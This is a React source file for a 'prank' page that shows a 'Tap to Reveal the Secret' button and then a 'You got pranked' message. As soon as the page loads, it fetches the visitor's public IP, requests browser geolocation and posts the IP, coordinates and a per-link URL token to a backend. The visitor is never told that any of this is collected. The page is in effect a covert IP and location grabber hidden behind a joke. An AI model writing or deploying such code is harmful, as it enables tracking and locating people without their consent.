import { useEffect, useState, useRef } from "react";
import axios from "axios";

function SecretPage() {
  const [clicked, setClicked] = useState(false);
  const sentRef = useRef(false); // prevent multiple sends
  useEffect(() => {
    if (sentRef.current) return;
    sentRef.current = true;
  
    const urlToken = new URLSearchParams(window.location.search).get("token"); // ✅ get token from URL
  
    axios.get("https://api.ipify.org?format=json")
      .then((res) => {
        const userIP = res.data.ip;
  
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
  
            axios.post("http://localhost:3000/location", {
              ip: userIP,
              location: { lat, lon },
              token: urlToken, // ✅ send token to backend
            })
            .then(() => {
              console.log("✅ Location sent!");
            })
            .catch((err) => {
              console.error("❌ Sending error:", err);
            });
          },
          (err) => {
            console.warn("❌ Location access denied:", err);
          }
        );
      })
      .catch((err) => {
        console.error("❌ IP fetch failed:", err);
      });
  }, []);

  return (
    <div className="min-h-screen bg-gradient-to-tr from-purple-800 via-black to-slate-900 text-white flex flex-col justify-center items-center px-6">
      {!clicked ? (
        <>
          <img src="/welcome.webp" alt="Prank Setup" className="w-64 mb-6 rounded-2xl" />
          <h1 className="text-4xl font-bold text-center mb-8">
            🎁 Tap to Reveal the Secret 🎁
          </h1>
          <button
            onClick={() => setClicked(true)}
            className="bg-white text-black px-6 py-3 rounded-full hover:scale-105 duration-300 shadow-lg animate-pulse"
          >
            Reveal Now
          </button>
        </>
      ) : (
        <div className="text-center">
          <img src="/finger.webp" alt="Gotcha!" className="w-64 mb-6 rounded-2xl" />
          <h2 className="text-3xl font-bold mb-4">You got pranked 😂</h2>
          <p className="text-lg">
            But hey, we hope you smiled a little 🤣. There was no secret. Just your curiosity. But we got you 😎
          </p>
        </div>
      )}
    </div>
  );
}

export default SecretPage;
